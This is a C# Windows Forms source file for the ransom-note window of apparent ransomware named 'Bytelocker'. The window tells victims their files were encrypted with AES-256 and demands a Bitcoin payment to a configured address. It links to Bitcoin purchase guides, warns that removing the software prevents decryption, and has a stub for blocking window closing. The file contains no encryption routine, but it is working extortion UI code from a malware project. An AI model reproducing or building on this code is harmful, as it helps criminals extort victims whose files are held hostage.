using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Bytelocker.UI
{
    public partial class MainWindow : Form
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            /*
             * Your important files, documents, pictures, etc. have been encrypted. Here is a complete list of encrypted files, you can verify this manually.

Encryption was produced using AES 256, in order to decrypt the files you need to obtain the password used to generate the key.

To obtain the password, you will need to pay 20$ USD or a similar amount in a different currency.

Click <<Next>> to select method of payment.

NOTE: Removal of this software will lead to inability to decrypt files.

             */
            this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted" + "\n\n");

            LinkLabel llListOfInfectedFiles = new LinkLabel();
            llListOfInfectedFiles.Text = "Here";
            llListOfInfectedFiles.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llListOfInfectedFiles_Click);
            llListOfInfectedFiles.AutoSize = true;
            llListOfInfectedFiles.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llListOfInfectedFiles);
            this.rtfInfo.AppendText(llListOfInfectedFiles.Text);
            this.rtfInfo.AppendText(new String(' ', 3));
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;

            this.rtfInfo.AppendText("is a complete list of encrypted files, you can verify this manually." + "\n\n" + "Encryption was produced" +
                " using");

            LinkLabel llAESInfo = new LinkLabel();
            llAESInfo.Text = "AES-256";
            llAESInfo.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llAESInfo_Click);
            llAESInfo.AutoSize = true;
            llAESInfo.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llAESInfo);
            this.rtfInfo.AppendText(llAESInfo.Text);
            this.rtfInfo.AppendText(new String(' ', 3));
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;

            this.rtfInfo.AppendText("in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
                "To obtain the password, you will need to pay $" + Bytelocker.COST_TO_DECRYPT.ToString() + " USD or a similar amount in a different currency." +
                "\n\n" + "Payment is accepted in Bitcoin only which is an open-source cryptocurrency which funds can be transfered through computer of smartphone without" +
                " interference of a bank or other financial institution" + "\n\n" + "You will need to send the");

            LinkLabel llUSDToBitcoin = new LinkLabel();
            llUSDToBitcoin.Text = "correct amount";
            llUSDToBitcoin.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llUSDToBitcoin_Click);
            llUSDToBitcoin.AutoSize = true;
            llUSDToBitcoin.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llUSDToBitcoin);
            this.rtfInfo.AppendText(llUSDToBitcoin.Text);
            this.rtfInfo.AppendText(new String(' ', 3));
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;


            this.rtfInfo.AppendText("amount converted to Bitcoin to the following address:" + "\n" +
                Bytelocker.BITCOIN_ADDRESS + "\n\n");

            LinkLabel llBitcoinInfo = new LinkLabel();
            llBitcoinInfo.Text = "Getting started with Bitcoin";
            llBitcoinInfo.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llBitcoinInfo_Click);
            llBitcoinInfo.AutoSize = true;
            llBitcoinInfo.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llBitcoinInfo);
            this.rtfInfo.AppendText(llBitcoinInfo.Text);
            this.rtfInfo.AppendText("\n");
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
        }

        // override alt-f4
        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
        }

        private void On_llAESInfo_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
        }

        private void On_llBitcoinInfo_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://bitcoin.org/en/getting-started");
        }

        private void On_llUSDToBitcoin_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.google.com/search?q=" + Bytelocker.COST_TO_DECRYPT + "+usd+to+bitcoin");
        }

        private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
        {
        }

        private void BtnNext_Click(object sender, EventArgs e)
        {
        }
    }
}
